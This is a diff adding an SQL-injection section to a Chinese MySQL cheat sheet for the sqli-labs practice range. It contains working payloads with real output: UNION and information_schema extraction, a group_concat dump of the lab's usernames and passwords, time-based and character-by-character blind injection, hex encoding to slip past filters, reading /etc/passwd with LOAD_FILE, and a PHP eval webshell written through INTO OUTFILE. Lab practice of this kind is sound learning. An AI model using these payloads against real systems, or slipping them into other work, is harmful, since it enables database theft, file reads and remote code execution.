@@ -8,6 +8,7 @@
 > 子查询、事务、索引、视图）是用 Python 自带的 SQLite 真跑的 —— 这些语句在 MySQL 里写法完全一致；
 > 少数 MySQL 独有语法（`AUTO_INCREMENT`、`SHOW`、`DATE_FORMAT`、`TRUNCATE` 等）在结果里标了
 > 「未实跑」，它们照着写没问题，但结果请以你自己的 MySQL 为准。
+> **例外**：C13「SQL 注入必备」用的是一台**真 MySQL**（sqli-labs 靶场容器里的 MySQL 5.5.44），那一节的结果是真实输出。
 >
 > 分类按日常使用顺序排：基础语法与类型 → 建表 → 插入 → 查询 → 条件 → 分组 → 连接 → 子查询 → 更新删除 → 函数 → 索引 → 事务视图；
 > 从上面的索引点条目名直接跳转。
@@ -92,6 +93,18 @@
 | C12 事务与视图 | [`事务 COMMIT 与 ROLLBACK`](#事务-commit-与-rollback-要么全成功要么全撤销) | 要么全成功、要么全撤销 |
 | C12 事务与视图 | [`CREATE VIEW 视图`](#create-view-视图-把常用查询存成一个虚拟表) | 把常用查询存成一个「虚拟表」 |
 | C12 事务与视图 | [`用户与权限`](#用户与权限-给程序建一个专用账号) | 给程序建一个专用账号 |
+| C13 SQL 注入必备 🔒 | [`UNION SELECT 联合查询`](#union-select-联合查询把两条-select-的结果拼在一起) | 把两条 SELECT 的结果拼在一起 |
+| C13 SQL 注入必备 🔒 | [`information_schema 元数据库`](#information_schema-元数据库拖库第一步查表名列名) | 拖库第一步：查表名、列名 |
+| C13 SQL 注入必备 🔒 | [`database() / user() / version()`](#database--user--version一句话问出当前环境) | 一句话问出当前库 / 账号 / 版本 |
+| C13 SQL 注入必备 🔒 | [`group_concat()`](#group_concat把多行拼成一行一次拖完) | 多行拼成一行，一次拖完 |
+| C13 SQL 注入必备 🔒 | [`三种注释符`](#三种注释符--------截断-sql-后半句) | `#` / `-- ` / `/**/` 截断 SQL 后半句 |
+| C13 SQL 注入必备 🔒 | [`ORDER BY N 判断列数`](#order-by-n判断列数union-前必做) | union 前必做：判断列数 |
+| C13 SQL 注入必备 🔒 | [`SLEEP() 时间盲注`](#sleep时间盲注没回显也能判断真假) | 没回显也能靠时间判断真假 |
+| C13 SQL 注入必备 🔒 | [`SUBSTR() + ASCII()`](#substr--ascii盲注逐字符取数据) | 盲注逐字符取数据 |
+| C13 SQL 注入必备 🔒 | [`LIMIT 与偏移`](#limit-与偏移一条一条拖数据) | 一条一条拖数据 |
+| C13 SQL 注入必备 🔒 | [`LOAD_FILE() / INTO OUTFILE`](#load_file--into-outfile读服务器文件--写-webshell) | 读服务器文件 / 写 webshell |
+| C13 SQL 注入必备 🔒 | [`0x 十六进制字符串`](#0x-十六进制字符串绕过引号过滤) | 绕过引号过滤 |
+| C13 SQL 注入必备 🔒 | [`堆叠查询（分号）`](#堆叠查询分号一次执行多条语句) | 一次执行多条语句 |
 
 ---
 
@@ -1552,6 +1565,211 @@ SHOW GRANTS FOR 'app'@'localhost';
 ```
 
 > ⚠️ 这些是 MySQL 专有的账号管理语句，本机没装 MySQL 所以**未实跑**；`'app'@'localhost'` 表示只允许本机登录。
+
+---
+
+## C13 SQL 注入必备（打靶场 / 理解注入用）
+
+> 这一节角度和前面不同：C1~C12 教「怎么写 SQL 干活」，这一节讲「**注入时怎么用 SQL 读别人的数据**」。
+> 示例在 **sqli-labs 靶场容器里的真 MySQL（5.5.44）** 上跑过，结果是真实输出（库用它自带的 `security`）。
+> 「解析」开头带 🔒 的，就是 Web 安全（SQL 注入）直接相关的条目。
+
+### `UNION SELECT` 联合查询：把两条 SELECT 的结果拼在一起
+
+**解析**　🔒 `UNION` 把上下两条 `SELECT` 的结果竖着合并（**列数必须相同**）。注入里用它把"你想查的东西"接到目标原来的查询后面，从而读到别的表。
+
+**操作**
+
+```sql
+SELECT id, username, password FROM users WHERE id = 1
+UNION SELECT 1, table_name, 3 FROM information_schema.tables
+WHERE table_schema = 0x7365637572697479;
+```
+```text
+id  username  password
+1   Dumb      Dumb
+1   emails    3
+1   referers  3
+1   uagents   3
+1   users     3
+```
+
+> ⚠️ 列数不一致会报 `The used SELECT statements have a different number of columns` —— 这正是注入前要先「判列数」的原因。
+
+### `information_schema` 元数据库：拖库第一步，查表名列名
+
+**解析**　🔒 MySQL 自带 `information_schema` 库，记录了**所有库 / 表 / 列的名字**。注入时你只拿到库名，用它就能列出库里有哪些表、表里有哪些列。
+
+**操作**
+
+```sql
+-- 列出 security 库的所有表（0x7365637572697479 = 'security' 的十六进制，避开引号过滤）
+SELECT table_name FROM information_schema.tables
+WHERE table_schema = 0x7365637572697479;
+```
+```text
+emails
+referers
+uagents
+users
+```
+```sql
+-- 列出 users 表的所有列名
+SELECT group_concat(column_name) FROM information_schema.columns
+WHERE table_schema = 0x7365637572697479 AND table_name = 0x7573657273;
+```
+```text
+id,username,password
+```
+
+> ⚠️ 记住路线：`tables`（有哪些表）→ `columns`（表里有哪些列）→ 具体表（读数据）。
+
+### `database()` / `user()` / `version()`：一句话问出当前环境
+
+**解析**　🔒 注入前先搞清楚"我在哪个库、用哪个账号、什么版本" —— 版本决定哪些注入语法能用。
+
+**操作**
+
+```sql
+SELECT database();   -- 当前库名
+SELECT user();       -- 当前数据库账号
+SELECT version();    -- MySQL 版本
+SELECT @@datadir;    -- 数据目录（写 webshell 时要找路径）
+```
+```text
+security
+root@localhost
+5.5.44-0ubuntu0.14.04.1
+/var/lib/mysql/
+```
+
+### `group_concat()`：把多行拼成一行，一次拖完
+
+**解析**　🔒 页面通常只有**一个回显位**（只能显示一行）。`group_concat()` 把多行用逗号拼成**一行**，就能一次把整张表读出来。
+
+**操作**
+
+```sql
+SELECT group_concat(username, 0x3a, password) FROM users;
+```
+```text
+Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+```
+
+> ⚠️ `0x3a` 是冒号 `:` 的十六进制（当分隔符，避免手写引号）。**这一条就是「拖库」最核心的一句话。**
+
+### 三种注释符 `#` / `-- ` / `/**/`：截断 SQL 后半句
+
+**解析**　🔒 注入时在 payload 末尾加注释，让服务器拼出来的 SQL **后半句失效**，只执行你想要的。
+
+**操作**
+
+```sql
+SELECT * FROM users WHERE id = 1 # 后面全被注释掉
+SELECT * FROM users WHERE id = 1 --  两个减号也是注释
+SELECT * FROM users WHERE id = 1 /* 块注释 */
+```
+
+> ⚠️ **MySQL 的 `--` 后面必须跟一个空格**（URL 里写 `--+` 或 `--%20`），否则不算注释 —— 新手最常卡的点。`#` 没这要求（URL 里要编码成 `%23`）。
+
+### `ORDER BY N`：判断列数（union 前必做）
+
+**解析**　🔒 `ORDER BY 3` 是"按第 3 列排序"，结果没那么多列就报错。注入时从 1 往上试，**报错的那个数字减 1 就是列数**。
+
+**操作**
+
+```sql
+SELECT id, username, password FROM users ORDER BY 3;   -- 正常
+SELECT id, username, password FROM users ORDER BY 4;   -- 报错 → 只有 3 列
+```
+```text
+ERROR 1054 (42S22): Unknown column '4' in 'order clause'
+```
+
+### `SLEEP()`：时间盲注，没回显也能判断真假
+
+**解析**　🔒 页面**既不显示数据也不报错**（盲注）时，用 `SLEEP(n)`：条件成立就让数据库睡 n 秒，**用响应时间**判断真假。
+
+**操作**
+
+```sql
+SELECT SLEEP(1);    -- 睡 1 秒
+```
+```text
+0        （这条查询耗时 1 秒）
+```
+
+### `SUBSTR()` + `ASCII()`：盲注逐字符取数据
+
+**解析**　🔒 盲注看不到内容，就把字符串**一个字符一个字符**问：`substr(串, 第几位, 取几个)` 取字符，`ascii()` 转成数字方便比较。
+
+**操作**
+
+```sql
+SELECT ascii(substr(database(), 1, 1));   -- 库名第 1 个字符的 ASCII
+```
+```text
+115          （115 = 's'，security 的首字母）
+```
+
+> ⚠️ 拿 115 和你的猜测比大小（如 `> 100`），配合时间/真假信号，一位一位问出整个字符串。
+
+### `LIMIT` 与偏移：一条一条拖数据
+
+**解析**　🔒 `LIMIT n` 取前 n 条，`LIMIT m, n` 从第 m 条起取 n 条。`group_concat` 被长度截断时，用它一条条取。
+
+**操作**
+
+```sql
+SELECT username, password FROM users LIMIT 0, 1;   -- 第 1 条
+SELECT username, password FROM users LIMIT 1, 1;   -- 第 2 条
+```
+```text
+username  password
+Dumb      Dumb
+```
+
+### `LOAD_FILE()` / `INTO OUTFILE`：读服务器文件 / 写 webshell
+
+**解析**　🔒 `LOAD_FILE('/path')` 能**读服务器上的文件**；`SELECT ... INTO OUTFILE '/path'` 把结果**写到服务器文件**（配合写权限可写一句话木马）。
+
+**操作**
+
+```sql
+SELECT LOAD_FILE('/etc/passwd');
+```
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+```sql
+SELECT '<?php @eval($_POST[1]); ?>' INTO OUTFILE '/var/www/html/x.php';
+```
+
+> ⚠️ 需要 `FILE` 权限 + 目录可写；`secure_file_priv` 会限制读写路径。
+
+### `0x` 十六进制字符串：绕过引号过滤
+
+**解析**　🔒 单引号被过滤时，把字符串写成 `0x` 开头的十六进制，MySQL 自动当字符串用。
+
+**操作**
+
+```sql
+SELECT username, password FROM users WHERE username = 0x61646d696e;   -- 0x61646d696e = 'admin'
+```
+```text
+username  password
+admin     admin
+```
+
+> ⚠️ 经典 WAF 绕过：`'admin'` 被拦 → `0x61646d696e` 照过。
+
+### 堆叠查询（分号）：一次执行多条语句
+
+**解析**　🔒 一个请求里用 `;` 分隔，一次执行多条 SQL（先注入、再删表）。**不是所有环境都支持**（PDO / 很多框架默认禁用）。
+
+> ⚠️ 说明"注入能做的事远不止读数据"；参数化查询能把这类一起挡掉。
 
 ---
 
